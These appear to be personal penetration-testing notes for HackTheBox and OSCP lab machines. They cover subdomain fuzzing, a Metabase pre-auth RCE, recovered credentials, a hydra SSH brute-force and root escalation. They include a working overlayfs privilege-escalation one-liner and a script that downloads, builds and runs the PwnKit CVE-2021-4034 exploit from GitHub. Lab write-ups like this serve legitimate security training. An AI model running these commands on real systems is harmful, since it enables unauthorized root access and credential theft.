after enumerating the subdomian found a lgin page but didn't worked

# on burpsuite this login page using /api/session endpoint so

![[../../windows box/jab/attachment/Pasted image 20240322141650.png]]


## on further enumerating found a /properties end point

```bash

┌──(dedrknex㉿kali)-[~/oscp/hackthebox/Analytics_10.10.11.233]
└─$ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404   -t 100 "http://data.analytical.htb/api/session/FUZZ" 

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://data.analytical.htb/api/session/FUZZ
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                
=====================================================================

000001411:   200        0 L      3364 W     74322 Ch    "properties"

```


## on visting found a page

![[../../windows box/jab/attachment/Pasted image 20240322141802.png]]


# Found a exploit on github

![[../../windows box/jab/attachment/Pasted image 20240322141833.png]]


https://github.com/m3m0o/metabase-pre-auth-rce-poc

found a shell

![[../../windows box/jab/attachment/Pasted image 20240322141940.png]]


# found cred after revshell
![[../../windows box/jab/attachment/Pasted image 20240322170351.png]]

META_USER=metalytics
META_PASS=An4lytics_ds20223#

## Got ssh
```bash

┌──(dedrknex㉿kali)-[~/oscp/hackthebox/Analytics_10.10.11.233]
└─$ ssh metalytics@10.10.11.233
The authenticity of host '10.10.11.233 (10.10.11.233)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:34: [hashed name]
    ~/.ssh/known_hosts:55: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.233' (ED25519) to the list of known hosts.
metalytics@10.10.11.233's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar 22 11:35:10 AM UTC 2024

  System load:              0.357421875
  Usage of /:               93.2% of 7.78GB
  Memory usage:             25%
  Swap usage:               0%
  Processes:                160
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.233
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:477c

  => / is using 93.2% of 7.78GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
metalytics@analytics:~$ 


```

# Okay for privesc tried linpeas etc nothing worked tried ... suid didn't help

## so

![[../../windows box/jab/attachment/Pasted image 20240322173225.png]]



``` bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

## used this to get root




```
┌──(dedrknex㉿kali)-[~/oscp/PWK/satpier_192.168.152.148]
└─$ hydra -L usernames.txt -e nsr  -t 4 ssh://192.168.232.148 -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-23 20:00:37
[DATA] max 4 tasks per 1 server, overall 4 tasks, 183 login tries (l:61/p:3), ~46 tries per task
[DATA] attacking ssh://192.168.232.148:22/
[STATUS] 34.00 tries/min, 34 tries in 00:01h, 149 to do in 00:05h, 4 active
[STATUS] 33.50 tries/min, 67 tries in 00:02h, 116 to do in 00:04h, 4 active
[STATUS] 33.33 tries/min, 100 tries in 00:03h, 83 to do in 00:03h, 4 active
[22][ssh] host: 192.168.232.148   login: SHayslett   password: SHayslett
[STATUS] 33.50 tries/min, 134 tries in 00:04h, 49 to do in 00:02h, 4 active
```


got root acces

```
SHayslett@red:/tmp$ vi exploit.sh
SHayslett@red:/tmp$ chmod +x exploit.sh 
SHayslett@red:/tmp$ ./exploit.sh 
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
# id
uid=0(root) gid=0(root) groups=0(root),1005(SHayslett)
# 


```

# exploit


``` bash

#!/usr/bin/env sh

URL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/'

for EXPLOIT in "${URL}/cve-2021-4034.c" \
               "${URL}/pwnkit.c" \
               "${URL}/Makefile"
do
    curl -sLO "$EXPLOIT" || wget --no-hsts -q "$EXPLOIT" -O "${EXPLOIT##*/}"
done

make

./cve-2021-4034

```

![[Pasted image 20240414154053.png]]
